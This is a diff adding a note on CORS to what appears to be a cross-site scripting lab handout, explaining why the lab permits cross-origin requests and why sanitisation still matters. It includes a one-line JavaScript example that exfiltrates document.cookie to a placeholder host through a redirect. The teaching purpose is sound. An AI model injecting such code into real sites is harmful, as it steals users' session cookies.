@@ -300,3 +300,35 @@ Hint:
 
 This type of attack is known as *persistent*,
 because the malicious code is stored in the website by the attacker.
+
+
+Note on CORS (Cross-Origin Resource Sharing)
+--------------------------------------------
+
+For security reasons modern browsers restrict cross-origin HTTP requests
+initiated from within scripts. This includes HTTP POST requests made using
+jQuery's ``.post`` method. In fact these requests are generally subject to the
+same-origin policy, meaning that the scripts can only make HTTP requests to
+their own domain, unless explicitly specified by the application's web server.
+
+For the purpose of this practical, CORS has been set to enforce a permissive
+policy for requests made from scripts within the web application. This is not
+realistic and is unlikely to happen on real websites. We believe this is justified
+by the fact that CORS is not an excuse to avoid doing proper input sanitisation,
+for the following reasons:
+
+(a) CORS relies on the browser being modern and up to date. Older browsers,
+    especially mobile phones' browsers, do not implement correctly, or fully,
+    CORS policies.
+
+(b) Other methods that circumvent CORS restrictions exist. For example, a Javascript
+    script could still make a HTTP GET request by redirecting the user,
+    e.g.:
+
+      .. code:: javascript
+
+        // Redirect the user to example.com/?cookies=PHPSESSID=123.....9;
+        window.location = "http://example.com/?cookies=" + document.cookie;
+
+You can read more about HTTP access control (CORS) at
+https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS.
